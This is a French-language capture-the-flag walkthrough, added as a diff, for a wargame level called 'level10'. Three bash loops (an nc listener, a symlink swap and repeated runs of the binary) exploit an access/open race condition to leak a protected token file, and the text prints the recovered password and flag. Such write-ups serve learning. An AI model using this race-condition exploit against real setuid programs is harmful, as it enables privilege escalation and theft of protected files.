@@ -1,0 +1,72 @@
+Level10
+Binaire: level10 et file: token.
+$> ./level10
+./level10 file host
+    sends file to host if you have access to it
+
+On dirait qu'il faut envoyer token sur un serveur
+$> ./level10 token localhost
+You don't have access to token
+
+On remarque que les fonctions open et access sont utilisés
+$> strings level10
+[...]
+open
+access (verifie les droits d'accés)
+[...]
+Connecting to %s:6969 ..
+Unable to connect to host %s
+.*( )*.
+Unable to write banner to host %s
+Connected!
+Sending file ..
+Damn. Unable to open file
+Unable to read from file: %s
+wrote file!
+You don't have access to %s
+
+
+On est deja familier avec le concept de la race condition (genre d'attaque en boucle pour faire en sorte que la machine check les droits sur un fichier et donne son accord pour le open puis juste apres on remplace ce fichier par un ou on n'a pas les droits et il open ce nouveau fichier)
+https://linux.die.net/man/1/nc
+On connait mtn la commande nc qui nous permet d'ecouter sur un port precis grace a l'option -l par exemple le port 6969 comme indiqué dans le strings
+En l'utilisant plusieurs fois on comprend que nc se ferme a chaque fois qu'on arrive a l'atteindre, on fait du coup un petit script:
+
+$> cd /tmp
+$> vim nc.sh
+
+#!/bin/bash
+while [ true ]; do
+        nc -l 6969
+done
+
+Dans un autre terminal on fait un second script:
+
+$> vim ln.sh
+
+#!/bin/bash
+while [ 1 ]; do
+        rm -rf /tmp/touken
+        touch /tmp/touken
+        rm -rf /tmp/touken
+        ln -s ~/token /tmp/touken
+done
+
+Puis dans un troisieme terminal on fait un dernier script:
+
+$> vim connect.sh
+
+#!/bin/bash
+while [ 1 ]; do
+        ~/level10 /tmp/touken 127.0.0.1
+done
+
+On lance dans l'ordre:
+$> sh nc.sh
+$> sh ln.sh
+$> sh connect.sh
+
+Le mot de passe apparait quelques fois dans le premier terminal: woupa2yuojeeaaed06riuj63c
+$> su flag10
+Password: woupa2yuojeeaaed06riuj63c
+$> getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
